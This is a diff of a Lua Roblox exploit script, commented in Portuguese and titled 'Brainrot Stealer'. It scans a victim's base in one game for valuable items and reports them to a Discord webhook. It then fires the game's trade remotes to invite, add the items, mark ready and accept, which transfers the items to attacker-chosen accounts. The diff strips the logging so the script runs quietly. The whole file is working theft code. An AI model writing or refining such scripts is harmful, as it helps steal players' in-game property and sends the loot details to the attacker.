@@ -1,11 +1,9 @@
--- STEALER SEM BLOQUEIO DE UI - Teste
--- Só escaneia, webhook e envia trade
+-- STEALER LIMPO - Sem metatable, sem debug, sem getconnections
+-- Só o básico: escanear → webhook → trade
 
 if game.PlaceId ~= 109983668079237 then
     return
 end
-
-print("[Stealer] Carregando...")
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -19,8 +17,6 @@ if #TARGET_USERS == 0 and getgenv().TARGET_USER then
 end
 local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
 local TARGET_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
-local TARGET_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
-local TARGET_GEARS = getgenv().NORMAL_GEARS or {}
 local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
 
 local tradeCompleted = false
@@ -101,25 +97,14 @@ local function scanBrainrots()
     for _, child in ipairs(base:GetChildren()) do
         if child:IsA("Model") and animalNames[child.Name] then
             if TARGET_BRAINROTS[child.Name] then
-                local gen = 0
-                pcall(function()
-                    local Animals2 = require(ReplicatedStorage:FindFirstChild("Shared"):FindFirstChild("Animals"))
-                    if Animals2 then
-                        gen = Animals2:GetGeneration(child.Name, nil, {}, nil)
-                    end
-                end)
-                
                 table.insert(found, {
                     name = child.Name,
-                    gen = gen,
-                    slotKey = child.Name,
-                    model = child
+                    slotKey = child.Name
                 })
             end
         end
     end
     
-    table.sort(found, function(a, b) return a.gen > b.gen end)
     return found
 end
 
@@ -142,7 +127,7 @@ local function sendWebhook(brainrots)
     local lines = {}
     if #brainrots > 0 then
         for _, item in ipairs(brainrots) do
-            table.insert(lines, "**" .. item.name .. "** [Brainrot] | Gen: **" .. formatNumber(item.gen) .. "**")
+            table.insert(lines, "**" .. item.name .. "** [Brainrot]")
         end
     else
         table.insert(lines, "Nenhum brainrot encontrado!")
@@ -153,12 +138,6 @@ local function sendWebhook(brainrots)
         description = description:sub(1, 3996) .. "..."
     end
     
-    local executorName = "Unknown"
-    pcall(function()
-        if identifyexecutor then executorName = identifyexecutor()
-        elseif getexecutorname then executorName = getexecutorname() end
-    end)
-    
     local embed = {
         title = "Brainrot Stealer",
         description = description,
@@ -167,11 +146,6 @@ local function sendWebhook(brainrots)
             {
                 name = "Server",
                 value = "Players: **" .. #Players:GetPlayers() .. "**",
-                inline = true
-            },
-            {
-                name = "Executor",
-                value = executorName,
                 inline = true
             }
         },
@@ -189,11 +163,9 @@ local function sendWebhook(brainrots)
             Body = HttpService:JSONEncode({
                 content = "@everyone",
                 embeds = { embed },
-                username = "Stealer",
-                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
+                username = "Stealer"
             })
         })
-        print("[Stealer] Webhook enviado!")
     end)
 end
 
@@ -218,21 +190,10 @@ local function isPlayerOnline(userId)
 end
 
 local function main()
-    print("[Stealer] SEM BLOQUEIO DE UI - Modo Teste")
-    print("[Stealer] Apenas escaneia, webhook e envia trade")
-    
     local brainrots = scanBrainrots()
-    print("[Stealer] Brainrots encontrados: " .. #brainrots)
-    
     sendWebhook(brainrots)
     
-    if #brainrots == 0 then
-        print("[Stealer] Nenhum brainrot encontrado!")
-        return
-    end
-    
-    if #TARGET_USERS == 0 then
-        print("[Stealer] Nenhum target configurado!")
+    if #brainrots == 0 or #TARGET_USERS == 0 then
         return
     end
     
@@ -241,14 +202,7 @@ local function main()
     local readyRemote = getRemote("TradeService/Ready")
     local acceptRemote = getRemote("TradeService/Accept")
     
-    print("[Stealer] Remotes encontrados:")
-    print("  Invite: " .. tostring(inviteRemote ~= nil))
-    print("  AddBrainrot: " .. tostring(addBrainrotRemote ~= nil))
-    print("  Ready: " .. tostring(readyRemote ~= nil))
-    print("  Accept: " .. tostring(acceptRemote ~= nil))
-    
     if not inviteRemote or not addBrainrotRemote then
-        print("[Stealer] Remotes não encontrados!")
         return
     end
     
@@ -257,45 +211,32 @@ local function main()
             if target ~= "" then
                 local userId = getUserIdFromName(target)
                 if userId and isPlayerOnline(userId) then
-                    print("[Stealer] Enviando invite para: " .. target .. " (ID: " .. userId .. ")")
-                    
                     local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
                     
                     if success then
-                        print("[Stealer] ✅ Invite enviado!")
                         task.wait(3)
                         
-                        for i, brainrot in ipairs(brainrots) do
-                            print("[Stealer] Adicionando: " .. brainrot.name)
+                        for _, brainrot in ipairs(brainrots) do
                             pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                             task.wait(1.5)
                         end
                         
                         if readyRemote and acceptRemote then
                             task.wait(3)
-                            print("[Stealer] Enviando Ready...")
                             pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
                             task.wait(2)
-                            print("[Stealer] Enviando Accept...")
                             pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
-                            print("[Stealer] ✅ Trade concluída!")
                             tradeCompleted = true
                         end
-                    else
-                        print("[Stealer] ❌ Falha ao enviar invite!")
                     end
-                else
-                    print("[Stealer] ❌ Usuário offline ou não encontrado: " .. target)
                 end
             end
         end
         
         if not tradeCompleted then
-            print("[Stealer] Aguardando " .. DELAY_BETWEEN_INVITES .. " segundos...")
             task.wait(DELAY_BETWEEN_INVITES)
         end
     end
 end
 
 pcall(main)
-print("[Stealer] Finalizado!")
